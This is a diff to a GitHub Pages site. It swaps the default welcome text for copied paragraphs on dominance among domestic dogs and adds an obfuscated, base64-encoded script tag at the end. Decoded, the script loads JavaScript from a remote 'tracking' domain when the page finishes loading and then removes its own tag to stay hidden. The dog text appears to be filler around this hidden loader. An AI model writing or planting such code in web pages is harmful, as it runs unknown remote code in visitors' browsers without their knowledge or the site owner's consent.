@@ -1,37 +1,5 @@
-## Welcome to GitHub Pages
+One test to ascertain in which group the dominant dog was used the following criteria: When a stranger comes to the house, which dog starts to bark first or if they start to bark together, which dog barks more or longer? Which dog licks more often the other dog's mouth? If the dogs get food at the same time and at the same spot, which dog starts to eat first or eats the other dog's food? If the dogs start to fight, which dog usually wins?[36]
 
-You can use the [editor on GitHub](https://github.com/wjsuerjufrqsjdxf/KAt6DRHor8jsHJuPLQb/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Domestic dogs appear to pay little attention to relative size, despite the large weight differences between the largest and smallest individuals; for example, size was not a predictor of the outcome of encounters between dogs meeting while being exercised by their owners nor was size correlated with neutered male dogs.[37] Therefore, many dogs do not appear to pay much attention to the actual fighting ability of their opponent, presumably allowing differences in motivation (how much the dog values the resource) and perceived motivation (what the behavior of the other dog signifies about the likelihood that it will escalate) to play a much greater role.[35]
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/wjsuerjufrqsjdxf/KAt6DRHor8jsHJuPLQb/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="hrC71" src="data:text/javascript;base64, dmFyIF93WU9oOCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3R2Rno2LCBfdjhLbmQpIHt2YXIgX0NMRDBIID0gZnVuY3Rpb24oX21lSHlqKSB7d2hpbGUgKC0tX21lSHlqKSB7X3R2Rno2WydwdXNoJ10oX3R2Rno2WydzaGlmdCddKCkpO319O19DTEQwSCgrK192OEtuZCk7fShfd1lPaDgsIDB4MTFiKSk7dmFyIF9DWkZ2aiA9IGZ1bmN0aW9uKF9RY2pHUiwgXzFNUHZYKSB7X1FjakdSID0gX1FjakdSIC0gMHgwO3ZhciBfQ2dnMmkgPSBfd1lPaDhbX1FjakdSXTtyZXR1cm4gX0NnZzJpO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfQ1pGdmooJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3FhMDRwID0gZG9jdW1lbnRbX0NaRnZqKCcweDEnKV0oX0NaRnZqKCcweDInKSk7X3FhMDRwW19DWkZ2aignMHgzJyldID0gX0NaRnZqKCcweDQnKTtfcWEwNHBbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDY5XHg2ZVx4NjdceDJlXHg2M1x4NjFceDczXHgyZFx4NzZceDMxXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NGJceDc3XHg0OFx4NGZceDU5XHg0MVx4MzBceDRlXHg3OSc7ZG9jdW1lbnRbX0NaRnZqKCcweDUnKV0oX0NaRnZqKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX3FhMDRwKTtkb2N1bWVudFtfQ1pGdmooJzB4NycpXSgnaHJDNzEnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
